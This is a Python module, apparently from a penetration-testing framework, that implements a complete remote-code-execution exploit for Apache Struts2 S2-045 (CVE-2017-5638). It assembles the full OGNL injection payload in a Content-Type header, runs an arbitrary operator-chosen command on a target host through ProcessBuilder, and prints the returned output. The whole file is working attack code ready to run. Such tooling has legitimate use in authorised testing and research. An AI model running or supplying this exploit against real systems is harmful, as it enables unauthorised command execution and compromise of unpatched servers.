import requests
from core.base_module import BaseModule
from rich.console import Console

class ApacheStruts2Rce(BaseModule):
    """Exploits Apache Struts2 S2-045 RCE (CVE-2017-5638)."""

    def get_options(self):
        """
        Returns the options for this module.
        """
        return {
            'RHOST': ['', 'The target host IP address.'],
            'RPORT': [8080, 'The target port.'],
            'CMD': ['whoami', 'The command to execute on the target.']
        }

    def run(self, options):
        """
        Executes the Apache Struts2 exploit.
        """
        rhost = options.get('RHOST')
        rport = int(options.get('RPORT'))
        cmd = options.get('CMD')
        console = Console()

        if not rhost:
            console.print("[!] RHOST must be set.", style="bold red")
            return

        url = f"http://{rhost}:{rport}/struts2-showcase/index.action"
        console.print(f"[*] Targeting URL: {url}")
        console.print(f"[*] Attempting to execute command: {cmd}")

        # Payload for CVE-2017-5638
        payload = f"%{{(#_='multipart/form-data')."
        payload += f"(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload += f"(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        payload += f"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        payload += f"(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())."
        payload += f"(#context.setMemberAccess(#dm))))."
        payload += f"(#cmd='{cmd}')."
        payload += f"(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        payload += f"(#cmds=(#iswin?{{'cmd.exe','/c',#cmd}}:{{'/bin/bash','-c',#cmd}}))."
        payload += f"(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())."
        payload += f"(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        payload += f"(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}}"

        headers = {'Content-Type': payload}

        try:
            response = requests.post(url, headers=headers, timeout=15)
            # The command output is in the response body
            output = response.text.strip()
            if output:
                console.print("[bold green][+] Command executed successfully![/bold green]")
                console.print(f"--- Command Output ---\n{output}\n----------------------")
            else:
                console.print("[yellow][-] Command executed, but no output was returned. The target might not be vulnerable or the command produced no output.[/yellow]")
        except requests.exceptions.RequestException as e:
            console.print(f"[!] Request failed: {e}", style="bold red")
        except Exception as e:
            console.print(f"[!] An unexpected error occurred: {e}", style="bold red")
